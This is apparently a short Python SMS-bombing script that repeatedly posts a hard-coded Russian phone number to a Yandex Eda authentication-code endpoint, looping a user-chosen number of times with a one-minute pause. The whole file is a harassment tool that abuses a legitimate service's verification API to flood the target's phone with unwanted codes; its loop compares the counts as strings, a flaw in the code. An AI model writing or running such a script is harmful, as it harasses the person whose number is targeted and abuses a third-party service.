import requests
from time import sleep

nomer = "+79091746012"
b= input("Введите число сообщений: ")
c = (1);

while (str(c) <= str(b)):
	a= requests.post("https://eda.yandex/api/v1/user/request_authentication_code",
		json={"phone_number": nomer},)
	print(a.text)
	c = c + 1;
	sleep(60)